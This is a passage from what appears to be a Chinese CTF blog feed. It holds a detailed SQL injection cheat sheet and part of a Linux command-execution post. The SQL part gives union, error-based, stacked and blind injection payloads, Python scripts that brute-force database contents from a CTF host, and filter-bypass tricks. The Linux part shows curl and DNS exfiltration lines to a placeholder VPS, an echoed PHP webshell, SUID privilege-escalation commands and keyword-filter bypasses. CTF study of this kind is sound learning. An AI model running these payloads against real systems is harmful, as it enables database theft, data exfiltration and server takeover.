fun[:-<span class="number">1</span>]:</span><br><span class="line">        exp += urlbm(each)</span><br><span class="line">        <span class="built_in">print</span>(exp)</span><br><span class="line">    exp += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(fun) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一些常见-RCE-形式&quot;&gt;&lt;a href=&quot;#一些常见-RCE-形式&quot; class=&quot;headerlink&quot; title=&quot;一些常见 RCE 形式&quot;&gt;&lt;/a&gt;一些常见 RCE 形式&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;eval($_POST[1]);
`$_GET[1]</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="RCE" scheme="https://blog.hatchet.top/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入汇总</title>
    <link href="https://blog.hatchet.top/posts/27c8c18f.html"/>
    <id>https://blog.hatchet.top/posts/27c8c18f.html</id>
    <published>2024-09-20T05:17:30.000Z</published>
    <updated>2024-09-22T15:28:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL-结构"><a href="#SQL-结构" class="headerlink" title="SQL 结构"></a>SQL 结构</h1><p>整个结构分为数据库(database)，表(table)，列(column)和数据。<br>具体关系如图</p><ul><li>数据库 mysql(database)</li><li><ul><li>表 ctf(table)</li></ul></li><li><ul><li><ul><li>列 secret (column)</li></ul></li></ul></li><li><ul><li><ul><li><ul><li>数据</li></ul></li></ul></li></ul></li><li><ul><li><ul><li>列 user (column)</li></ul></li></ul></li><li><ul><li><ul><li><ul><li>数据</li></ul></li></ul></li></ul></li><li><ul><li>表 score(table)</li></ul></li><li><ul><li><ul><li>……</li></ul></li></ul></li></ul><p>查询语句通常为 select a from b where c<br>查库名 select schema_name from information_schema.schemata<br>查表名 select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<br>查列名 select group_concat(column_name) from information_schema.columns where table_name&#x3D;’ctf’<br>查数据 select group_concat(secret,user) from ctf</p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><ul><li>适合有回显的情况</li></ul><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><h3 id="数字类（如-id）"><a href="#数字类（如-id）" class="headerlink" title="数字类（如 id）"></a>数字类（如 id）</h3><pre><code>$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</code></pre><p>直接在数字后注入，不需要空格</p><h3 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h3><pre><code>SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;;</code></pre><p>需要引号闭合。看题目，如果没给源码一般是单个’或”闭合，如果给了源码要判断所有的闭合，记得括号也要闭合完全</p><h2 id="手动注"><a href="#手动注" class="headerlink" title="手动注"></a>手动注</h2><p>sql 结尾要使用注释符号，常见的有：<br>--+（这里的+是 url 编码过的空格）,<br>--%20（get 传参网站自动省略最后的空格）,<br>#,%23（经过 url 编码）。<br>还可以构造如 or ‘1’&#x3D;’1 来闭合后面的引号，类似的还有末尾加’,where&#x2F;**&#x2F;‘1，（做多了题感觉注释真的很看脸，注释不成功就注不下去了）</p><ul><li>1’ or true# (万能密码)(在这里解决闭合和注释)</li><li>1’ order by 3#<br> 一直累加数字直到报错（或界面与之前不同）：<br> 1’ order by 4#<br>Unknown column ‘4’ in ‘order clause<br>这时说明一共 3 位，联合查询 3 位。</li><li>a’union select 1,2,3#<br>回显的数字说明哪里是回显位。例子中回显的是 2</li><li>a’union select 1,database(),3#<ul><li>库名 mysql</li></ul></li><li>a’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#<ul><li>表名 ctf</li><li>有种类似写法是把 select 写到里面：<br>a’union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3#。个人不推荐，很影响美观</li></ul></li><li>a’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’ctf’#<ul><li>列名 secret</li></ul></li><li>a’union select 1,group_concat(secret),3 from ctf#<ul><li>得到 flag，这里 from 后面可以不需要引号</li><li>如果限制字符长度可能读不全，需要使用函数截取长度<br>常见的如 substring,substr,mid,right,left（读不出来记得换，小心过滤）<ul><li>a’union select 1,substring(group_concat(secret),0,30),3 from ctf#</li><li>a’union select 1,substring(group_concat(secret),25,30),3 from ctf#<ul><li>记得合并时去除重叠字符</li></ul></li></ul></li><li>一次读多个数据这样写<ul><li>a’union select 1,group_concat(id,’<del>‘,username,’</del>‘,password),3 from user#</li></ul></li></ul></li></ul><h2 id="自动注-没找到一键绕-waf-的工具"><a href="#自动注-没找到一键绕-waf-的工具" class="headerlink" title="自动注(没找到一键绕 waf 的工具)"></a>自动注(没找到一键绕 waf 的工具)</h2><h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>曾经直接注被 Cookies 卡了半天。我更推荐把 http 文件保存下来用 sqlmap。</p><ul><li>直接 GET 注： python sqlmap.py -u “url?id&#x3D;1” –batch</li><li>使用-r 参数<br>用 burp 保存为 1.txt 放到同目录。<br>python sqlmap.py -r 1.txt -p username –batch<ul><li>库名 python sqlmap.py -r 1.txt -p username –batch –dbs<ul><li>当前库名 python sqlmap.py -r 1.txt -p username –batch –current-db</li></ul></li><li>表名 python sqlmap.py -r 1.txt -p username –batch -D mysql –tables</li><li>列名数据一起 python sqlmap.py -r 1.txt -p username –batch -D mysql -T ctf –columns –dump</li></ul></li><li>选择注入方法 –-technique<ul><li>默认为所有<ul><li>注入类型对应的参数<br> B：基于布尔的盲注<br> E：基于错误<br> U：基于联合查询<br> S：堆叠查询<br> T：基于时间的盲注<br> Q：内联查询<br>python sqlmap.py -r 1.txt -p username –-technique BE –batch</li></ul></li></ul></li><li>SQLMAP 写 shell<br> python sqlmap.py -r 1.txt -p username –batch –os-shell<br> 找不到 flag 时可以试试</li></ul><p>绕 waf 不好用，不如手写。想了解可以自己搜搜，要加巨多规则。</p><h1 id="报错注入（待解释）"><a href="#报错注入（待解释）" class="headerlink" title="报错注入（待解释）"></a>报错注入（待解释）</h1><ul><li><p>extractvalue</p><pre><code>1&#39;||extractvalue(1,concat(&#39;~&#39;,database()))#1&#39;||extractvalue(1,concat(&#39;~&#39;,(select(group_concat(schema_name))from(information_schema.schemata))))#1&#39;||extractvalue(1,concat(&#39;~&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;security&#39;))))#1&#39;||extractvalue(1,concat(&#39;~&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;users&#39;))))#1&#39;||extractvalue(1,concat(&#39;~&#39;,(select(data)from(output))))#1&#39;||extractvalue(1,concat(&#39;~&#39;,(select(mid((data),25,30))from(output))))#</code></pre></li><li><p>updatexml</p><pre><code>1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;data1&#39;)),0x7e),1))#1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#39;~&#39;,password))from(data1)),0x7e),1))#1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(user)),0x7e),1))#1&#39;or(updatexml(1,concat(0x7e,(select(substring(group_concat(link),25,30))from(user)),0x7e),1))#1&#39;or(updatexml(1,concat(0x7e,(select(right(group_concat(link),25))from(user)),0x7e),1))#//substring,substr,mid,right,left</code></pre></li></ul><h1 id="堆叠注入（待解释）"><a href="#堆叠注入（待解释）" class="headerlink" title="堆叠注入（待解释）"></a>堆叠注入（待解释）</h1><p>在 SQL 终端 中，分号（;）是用来表示一条 sql 语句的结束。在 ; 结束一个 sql 语句后继续构造下一条语句，语句会一起执行。</p><pre><code>*,11;set sql_mode=pipes_as_concat;select 11&#39;;show databases;#得表名supersqli1&#39;;use supersqli;show tables;#1&#39;;use supersqli;show columns from `words`;#1&#39;;use supersqli;show columns from `1919810931114514`;#①1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#1&#39;or 1=1#②1&#39;;use supersqli;SET @sql=concat(&#39;s&#39;,&#39;elect `flag` from `1919810931114514`&#39;);PREPARE sql1 from @sql;EXECUTE sql1;#③1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</code></pre><h1 id="布尔，时间盲注"><a href="#布尔，时间盲注" class="headerlink" title="布尔，时间盲注"></a>布尔，时间盲注</h1><p>利用脚本 二分查找所有可见字符<br>sql_bool.py</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 查库名</span></span><br><span class="line"><span class="comment"># payload1 = &quot;1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;  # 库名为news</span></span><br><span class="line">payload1 = <span class="string">&quot;1/**/and(ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="comment"># payload2 = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;news&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;  # 表名为admin,contents</span></span><br><span class="line">payload2 = <span class="string">&quot;1/**/and(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment"># 查字段</span></span><br><span class="line"><span class="comment"># payload3 = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;admin&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;  # admin表里有id,username,password,is_enable</span></span><br><span class="line">payload3 = <span class="string">&quot;1/**/and(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment"># 查字段值</span></span><br><span class="line"><span class="comment"># payload4 = &quot;1^(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;1/**/and(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">28</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        url = <span class="string">&quot;http://node5.anna.nssctf.cn:25132/?stunum=&quot;</span></span><br><span class="line">        payload = payload4.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        url += payload <span class="comment"># GET</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># data = &#123;&quot;username&quot;: payload&#125; # POST</span></span><br><span class="line">        <span class="comment"># r = requests.post(url=url, data=data).text</span></span><br><span class="line">        <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> low == <span class="number">28</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sql_time.py</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 查库名</span></span><br><span class="line"><span class="comment"># payload1 = &quot;1 and if(ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),0)#&quot;  # 库名为news</span></span><br><span class="line">payload1 = <span class="string">&quot;1/**/and(if(ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),0))#&quot;</span></span><br><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="comment"># payload2 = &quot;1 and if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),0)#&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;1/**/and(if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),0))#&quot;</span></span><br><span class="line"><span class="comment"># 查字段</span></span><br><span class="line"><span class="comment"># payload3 = &quot;1 and if(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),0)#&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;1/**/and(if(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),0))#&quot;</span></span><br><span class="line"><span class="comment"># 查字段值</span></span><br><span class="line"><span class="comment"># payload4 = &quot;1 and if(ord(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),0)#&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;1/**/and(if(ord(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,sleep(2),0))#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 超时的秒数，来判断注入是否成功</span></span><br><span class="line">time_threshold = <span class="number">1.5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">28</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        url = <span class="string">&quot;http://node5.anna.nssctf.cn:25132/?stunum=&quot;</span></span><br><span class="line">        payload = payload4.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        url += payload  <span class="comment"># GET 请求</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># data = &#123;&quot;username&quot;: payload&#125; # POST 请求</span></span><br><span class="line">        <span class="comment"># r = requests.post(url=url, data=data).text</span></span><br><span class="line">        response_time = time.time() - start_time</span><br><span class="line">        <span class="keyword">if</span> response_time &gt; time_threshold:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low == <span class="number">28</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>waf 不强可以用 SQLMAP 省时间</li></ul><h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><h2 id="大小写，双写"><a href="#大小写，双写" class="headerlink" title="大小写，双写"></a>大小写，双写</h2><p>字面意思，有些过滤不严的只过滤全小写，sql 对大小写不敏感，构造 Select 就能绕过，双写如过滤 or 在中间再写一遍，oorr 就绕过了<br>判断通过报错中没有对应关键字逐一尝试就行（应该不会有出题人不给源码和报错又加双写吧）</p><h2 id="16-进制转换"><a href="#16-进制转换" class="headerlink" title="16 进制转换"></a>16 进制转换</h2><p>可以把引号内的字符串转为 0x 开头的 16 进制数来绕过<br>‘flag’-&gt;0x666c6167</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;0x&#x27;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="常用替换"><a href="#常用替换" class="headerlink" title="常用替换"></a>常用替换</h2><ul><li>空格-&gt;&#x2F;**&#x2F;,括号绕过,%a0,%09</li><li>and-&gt;&amp;&amp;</li><li>or-&gt;||</li><li>&#x3D;-&gt;like,regexp</li><li>database()-&gt;schema()</li><li>table_schema-&gt;database_name</li><li>information_schema—-&gt;无列名注入</li></ul><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><pre><code>--空格--+#%23^1末尾加&#39;or &#39;1&#39;=&#39;1where/\*\*/&#39;1</code></pre><h2 id="大于小于号绕过"><a href="#大于小于号绕过" class="headerlink" title="大于小于号绕过"></a>大于小于号绕过</h2><p>在 sql 盲注中，一般使用大小于号来判断 ascii 码值的大小来达到爆破的效果。<br>绕过可以使用下列函数:</p><ul><li>greatest(n1, n2, n3…):返回 n 中的最大值</li><li>least(n1,n2,n3…):返回 n 中的最小值</li></ul><p>select * from cms_users where userid&#x3D;1 and greatest(ascii(substr(database(),1,1)),1)&#x3D;99;<br>1</p><ul><li>strcmp(str1,str2):<br>若所有的字符串均相同，则返回 STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1<br>select * from cms_users where userid&#x3D;1 and strcmp(ascii(substr(database(),0,1)),99);</li><li>in + 关键字<br>select * from cms_users where userid&#x3D;1 and substr(database(),1,1) in (‘c’);</li><li>between a and b:范围在 a-b 之间（不包含 b）<br>select * from cms_users where userid&#x3D;1 and substr(database(),1,1) between ‘a’ and ‘d’;</li></ul><h2 id="concat-被过滤"><a href="#concat-被过滤" class="headerlink" title="concat 被过滤"></a>concat 被过滤</h2><ul><li>在 select 语句结尾加 limit 1（只会读取一个数据，即第一个）<br>可以逐一读取直到读到想要的值<br>limit 0,1-&gt;第一个,limit 1,1-&gt;第二个,limit 2,1-&gt;第三个…<br><a href="https://blog.csdn.net/nicai321/article/details/123119356">https://blog.csdn.net/nicai321/article/details/123119356</a></li></ul><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>适用 information_schema 被过滤。<br>原理为将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询</p><pre><code>1&#39;union/**/select/**/1,2,`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/&#39;11&#39;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/&#39;1</code></pre><p>当&#96;反引号也被过滤时，使用 as 别名替换绕过</p><pre><code>1&#39;union/**/select/**/1,2,group_concat(a)/**/from/**/(select/**/1/**/as/**/a/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/&#39;1</code></pre><h2 id="过滤了小括号"><a href="#过滤了小括号" class="headerlink" title="过滤了小括号()"></a>过滤了小括号()</h2><p>运气做出来过一题，记录一下<br>concat()转为 limit,然而 limit 也被屏蔽后。。</p><pre><code>eid002&#39;+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Schemata+Where+Schema_name+like+binary+&#39;A%&#39;%23eid002&#39;+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Tables+Where+Table_Schema+like+binary+&#39;A%&#39;%23eid002&#39;+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Tables+Where+Table_Schema+like+&#39;ctf&#39;+and+Table_name+like+binary+&#39;A%&#39;%23eid002&#39;+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Columns+Where+Table_Schema+like+&#39;ctf&#39;+and+Table_name+like+&#39;f1444444g&#39;+and+Column_name+like+binary+&#39;A%&#39;%23eid002&#39;+Union+Select+1,2,fl4g,4,5+From+f1444444g%23</code></pre><p>靠执行成功时数字溢出进行布尔盲注。</p><h1 id="SQL-杂项"><a href="#SQL-杂项" class="headerlink" title="SQL 杂项"></a>SQL 杂项</h1><ul><li><p>ffifdyop md5($password,’true’)-&gt;ffifdyop</p></li><li><p>可尝试 load_file()直接读入</p><ul><li>1’union select 1,2,3,4,load_file(‘&#x2F;flag’)</li></ul></li><li><p>SQL 登录题</p><ul><li>username&#x3D;1’ union select 1,’admin’,’e10adc3949ba59abbe56e057f20f883e’#&amp;pw&#x3D;123456</li><li>username&#x3D;admin’&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup#&amp;password&#x3D;</li></ul></li><li><p>quine 注入<br>过滤了 char，用 chr 或者 0x 代替</p><pre><code>.1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#B1&#39;/**/union/**/select/**/replace(replace(&#39;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#39;,char(34),char(39)),char(66),&#39;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#39;)#%1&#39;/**/union/**/select/**/REPLACE(replace(&#39;&quot;/**/union/**/select/**/REPLACE(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#39;,0x22,0x27),0x25,&#39;&quot;/**/union/**/select/**/REPLACE(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#39;)#</code></pre></li><li><ul><li>char()转为 0x 脚本</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">str_input = <span class="string">&quot;&quot;&quot;1&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#x27;,char(34),char(39)),char(66),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;B&quot;,char(34),char(39)),char(66),&quot;B&quot;)#&#x27;)#&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_to_hex</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;num:x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">result = re.sub(<span class="string">r&quot;char\((\d+)\)&quot;</span>, char_to_hex, str_input)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>UPDATE 注入<ol><li>注册时将用户名设为如 admin’– ,admin’#,通过修改密码处的 UPDATE 函数修改原本密码。</li><li>修改商品价格 1’;UPDATE items SET price&#x3D;1;#</li></ol></li></ul>]]></content>
    
    
    <summary type="html">尽量写的详细</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>linux命令执行</title>
    <link href="https://blog.hatchet.top/posts/5eef1d19.html"/>
    <id>https://blog.hatchet.top/posts/5eef1d19.html</id>
    <published>2024-09-18T16:24:00.000Z</published>
    <updated>2024-09-25T09:38:37.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="常见命令执行命令"><a href="#常见命令执行命令" class="headerlink" title="常见命令执行命令"></a>常见命令执行命令</h2><pre><code>systemexecpassthrushell_exec</code></pre><p>exec 和 shell_exec 无回显</p><ul><li><p>保存到文件</p><pre><code>  cmd=ls /|tee 1.txt  或 cmd=ls / &gt; 1.txt  访问 http://url/1.txt</code></pre></li><li><p>通过 curl 外带</p><pre><code>  curl http://yourvpsip.com/`ls / | base64`</code></pre></li><li><p>Dns 外带<br>通过 DNS 网站 ping 通时传输数据<br>国内的网站如 <a href="http://ceye.io/">CEYE</a> 和 <a href="https://dnslog.cn/">DNSlog</a></p><pre><code>  ping `cat /flag | base64`.abcdef.ceye.io  ping `cat /flag | base64`.xxxxxxx.dnshook.site</code></pre></li><li><p>直接写马<br>通过 echo 命令写 php 木马，蚁剑连接</p><pre><code>  echo &#39;&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;&#39; &gt; 1.php  不用单引号的话就得在$前加\</code></pre></li></ul><h2 id="个人收集常见指令"><a href="#个人收集常见指令" class="headerlink" title="个人收集常见指令"></a>个人收集常见指令</h2><pre><code>查看目录：ls,dir移动目录：cd删除文件：rm &lt;文件名&gt;查看文件: cat等复制文件：cp &lt;文件名&gt; &lt;文件名&gt;重命名：mv &lt;文件名&gt; &lt;文件名&gt;</code></pre><h2 id="部分-SUID-命令提权"><a href="#部分-SUID-命令提权" class="headerlink" title="部分 SUID 命令提权"></a>部分 SUID 命令提权</h2><p>寻找所有权限带 s 的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br><span class="line"></span><br><span class="line">-user 指定文件拥有者</span><br><span class="line">-perm 文件权限</span><br><span class="line">-<span class="built_in">exec</span> 执行系统命令</span><br><span class="line">/usr/bin/sudo -l 列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><pre><code>find /etc/passwd -exec whoami \;find /etc/passwd -exec ls / \;/usr/bin/sudo find /etc/passwd -exec cat /flag \;</code></pre><h3 id="date-读取文件"><a href="#date-读取文件" class="headerlink" title="date 读取文件"></a>date 读取文件</h3><pre><code>date -f/--file &lt;filename&gt;</code></pre><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><pre><code>awk &#39;BEGIN &#123;system(&quot;whoami&quot;)&#125;&#39;</code></pre><h3 id="sed-读取文件"><a href="#sed-读取文件" class="headerlink" title="sed 读取文件"></a>sed 读取文件</h3><pre><code>sed -n &#39;1p&#39; /flag</code></pre><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><pre><code>vim /etc/sudoers添加你的账户sudo bash</code></pre><h3 id="file-读取文件"><a href="#file-读取文件" class="headerlink" title="file 读取文件"></a>file 读取文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file -f /flag</span><br></pre></td></tr></table></figure><h2 id="linux-管道符"><a href="#linux-管道符" class="headerlink" title="linux 管道符"></a>linux 管道符</h2><pre><code>; 前面执行完成后再执行后面的语句| 直接执行后面的执行语句|| 只有前面执行出错时才执行后面的执行语句&amp; 无论前面真假都执行后面的语句&amp;&amp; 只有前面为真才执行后面的语句换行符也可以%0a、%0d、\n</code></pre><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><pre><code>flag 被过滤cat /flagcat /fla\gcat /fla&quot;&quot;gcat /fla&#39;&#39;gcat /fl??cat /f\*cat /[e-h][k-m][9-b][e-h]cat /fl$1agcat /fl$2agcat /fl$@ag/???/?at /flaga=g;cat /fla$a</code></pre><h3 id="cat-类似命令"><a href="#cat-类似命令" class="headerlink" title="cat 类似命令"></a>cat 类似命令</h3><pre><code>more、less、head、tail、sort、tac、nl</code></pre><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><pre><code>&lt; 